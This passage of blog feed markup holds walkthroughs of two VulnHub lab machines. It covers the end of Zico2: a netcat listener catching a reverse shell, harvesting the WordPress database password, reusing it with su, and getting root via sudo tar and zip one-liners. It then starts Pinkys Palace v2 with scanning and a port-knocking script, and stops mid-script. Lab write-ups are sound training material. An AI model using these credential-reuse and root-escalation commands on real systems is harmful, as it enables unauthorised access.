&lt;p&gt;&lt;img src=&quot;/assets/images/zico2/screenshot-13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We have a shell with user privileges &lt;strong&gt;www-data&lt;/strong&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-vlnp&lt;/span&gt; 443
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.179.1] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.179.179] 55927
www-data@zico:/var/www&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Listing the wordpress config file in the zico’s home directory.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@zico:/home/zico/wordpress&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-40&lt;/span&gt; wp-config.php
&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-40&lt;/span&gt; wp-config.php
...
// &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt; MySQL settings - You can get this info from your web host &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt; //
/&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt; The name of the database &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;WordPress &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/
define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_NAME'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'zico'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

/&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt; MySQL database username &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/
define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_USER'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'zico'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

/&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt; MySQL database password &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/
define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_PASSWORD'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'sWfCsfJSPV9H3AmQzw8'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

/&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt; MySQL &lt;span class=&quot;nb&quot;&gt;hostname&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/
define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_HOST'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'zico'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

/&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt; Database Charset to use &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;creating database tables. &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/
define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_CHARSET'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'utf8'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

/&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt; The Database Collate type. Don&lt;span class=&quot;s1&quot;&gt;'t change this if in doubt. */
define('&lt;/span&gt;DB_COLLATE&lt;span class=&quot;s1&quot;&gt;', '');
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We reuse the wordpress password to login as user zico.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@zico:/home/zico&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su zico
su zico
Password: sWfCsfJSPV9H3AmQzw8

zico@zico:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;zico&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;zico&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;zico&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The zico user has sudo privileges to run the tar and zip binaries, we’ll use the both to get root.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;zico@zico:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;zico on this host:
    env_reset, &lt;span class=&quot;nv&quot;&gt;exempt_group&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;admin,
    &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin

User zico may run the following commands on this host:
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /bin/tar
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/zip
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;
&lt;h3 id=&quot;sudo-permissions&quot;&gt;Sudo Permissions&lt;/h3&gt;

&lt;p&gt;To get root via tar we execute the following command which will run /bin/bash on every checkpoint, this method was extracted from &lt;a href=&quot;https://gtfobins.github.io/gtfobins/tar/#sudo&quot;&gt;GTFOBINS&lt;/a&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;zico@zico:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /bin/tar &lt;span class=&quot;nt&quot;&gt;-cf&lt;/span&gt; /dev/null /dev/null &lt;span class=&quot;nt&quot;&gt;--checkpoint&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nt&quot;&gt;--checkpoint-action&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/bin/bash
&amp;lt;&lt;span class=&quot;nt&quot;&gt;-cf&lt;/span&gt; /dev/null /dev/null &lt;span class=&quot;nt&quot;&gt;--checkpoint&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nt&quot;&gt;--checkpoint-action&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/bin/bash   
/bin/tar: Removing leading &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;/&lt;span class=&quot;s1&quot;&gt;' from member names
root@zico:~#
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We execute the following zip command to get root, this topic was obtained from &lt;a href=&quot;https://gtfobins.github.io/gtfobins/zip/#sudo&quot;&gt;GTFOBINS&lt;/a&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;zico@zico:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /usr/bin/zip /dev/null /etc/sudoers &lt;span class=&quot;nt&quot;&gt;-T&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-TT&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'bash #'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /usr/bin/zip /dev/null /etc/sudoers &lt;span class=&quot;nt&quot;&gt;-T&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-TT&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'bash #'&lt;/span&gt;
  adding: etc/sudoers &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;deflated 49%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
root@zico:~#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And finally we read the root flag.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@zico:~# &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root
root@zico:/root# &lt;span class=&quot;nb&quot;&gt;ls 
ls
&lt;/span&gt;flag.txt
root@zico:/root# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag.txt
&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag.txt
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# ROOOOT!&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# You did it! Congratz!&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# &lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Hope you enjoyed! &lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# &lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# &lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>s4rgaz</name></author><summary type="html">Description: A Boot2Root Machine intended to simulate a real world scenario</summary></entry><entry><title type="html">VulnHub - Pinkys Palace v2</title><link href="http://localhost:4000/pinkys-palace-v2.html" rel="alternate" type="text/html" title="VulnHub - Pinkys Palace v2" /><published>2021-12-18T00:00:00-05:00</published><updated>2021-12-18T00:00:00-05:00</updated><id>http://localhost:4000/pinkys_palace_v2</id><content type="html" xml:base="http://localhost:4000/pinkys-palace-v2.html">&lt;p&gt;&lt;strong&gt;Description:&lt;/strong&gt; A realistic Boot2Root.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Author:&lt;/strong&gt; Pink_Panther&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Operating System:&lt;/strong&gt; Linux&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Aim:&lt;/strong&gt; Gain access to the system and read the /root/root.txt.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Download:&lt;/strong&gt; &lt;a href=&quot;https://www.vulnhub.com/entry/pinkys-palace-v2,229/&quot;&gt;https://www.vulnhub.com/entry/pinkys-palace-v2,229/&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;information-gathering&quot;&gt;Information Gathering&lt;/h2&gt;
&lt;h3 id=&quot;host-discovery&quot;&gt;Host Discovery&lt;/h3&gt;

&lt;p&gt;A ping scan on the local network discovered the target machine, the script can be found &lt;a href=&quot;https://github.com/s4rgaz/hdiscovery.git&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;hdiscovery.py &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; 192.168.179.0/24
192.168.179.178 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; up
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;port-scanning&quot;&gt;Port Scanning&lt;/h3&gt;

&lt;p&gt;With the aim of revealing open ports a full TCP port scan was performed.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p1-65535&lt;/span&gt; 192.168.179.178 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; nmap/all-tcp-ports.txt
...
PORT      STATE    SERVICE
80/tcp    open     http
4655/tcp  filtered unknown
7654/tcp  filtered unknown
31337/tcp filtered Elite
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;service-enumeration&quot;&gt;Service Enumeration&lt;/h3&gt;

&lt;p&gt;As we know, that only port 80 is open, we proceed to get more information about this port.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p80&lt;/span&gt; 192.168.179.178 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; nmap/service-enum.txt
...
PORT      STATE    SERVICE VERSION
80/tcp    open     http    Apache httpd 2.4.25 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;web-enumeration&quot;&gt;Web Enumeration&lt;/h3&gt;

&lt;p&gt;For a correct resolution of the web page, we add the following instruction to the hosts file on the attacking machine.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'192.168.179.178 pinkydb'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /etc/hosts
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, We can browse in the web page, it’s a wordpress.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/pinkysv2/screenshot-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;With wpscan we can do an additional enumeration in wordpress to detect vulnerable plugins and themes, as well as existing users.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wpscan &lt;span class=&quot;nt&quot;&gt;--url&lt;/span&gt; http://pinkydb/ &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; vp,vt,u
...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] XML-RPC seems to be enabled: http://pinkydb/xmlrpc.php    
 | Found By: Direct Access &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Aggressive Detection&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;             
 | Confidence: 100%
 ...
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] WordPress version 4.9.4 identified &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Insecure, released on 2018-02-06&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
 | Found By: Rss Generator &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Passive Detection&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 ...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] WordPress version 4.9.4 identified &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Insecure, released on 2018-02-06&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  
 | Found By: Rss Generator &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Passive Detection&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                             
 |  - http://pinkydb/?feed&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;rss2, &amp;lt;generator&amp;gt;https://wordpress.org/?v&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4.9.4&amp;lt;/generator&amp;gt; 
 |  - http://pinkydb/?feed&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;comments-rss2, &amp;lt;generator&amp;gt;https://wordpress.org/?v&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4.9.4&amp;lt;/generator&amp;gt;
...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;i] User&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Identified:

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] pinky1337
 | Found By: Author Posts - Display Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Passive Detection&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This reveals the wordpress version and a user, with the objective of discovering more information, I ran dirb to find hidden web content.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dirb http://pinkydb 
...
&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt; Scanning URL: http://pinkydb/ &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
+ http://pinkydb/index.php &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:301|SIZE:0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; DIRECTORY: http://pinkydb/secret/     
+ http://pinkydb/server-status &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:403|SIZE:295&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; DIRECTORY: http://pinkydb/wordpress/ 
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; DIRECTORY: http://pinkydb/wp-admin/   
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; DIRECTORY: http://pinkydb/wp-content/  
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; DIRECTORY: http://pinkydb/wp-includes/ 
+ http://pinkydb/xmlrpc.php &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:405|SIZE:42&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;At the previous exit, we can see a directory called secret, so we access to it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/pinkysv2/screenshot-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This contains three numbers as a sequence of ports and the word pinkydb.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/pinkysv2/screenshot-3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There is a technique called “Port Knoking” that allows us to open ports, when connecting to a series of ports in the correct order, I wrote a python script to discover the correct order of the sequence, in such a way it was possible to open the filtered ports found with nmap.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;itertools&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;192.168.179.178&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ports&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8890&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;666&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;settimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;permutation&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;itertools&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;permutations&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;permutation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;f&quot;Trying  =&amp;gt; &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;&lt;span 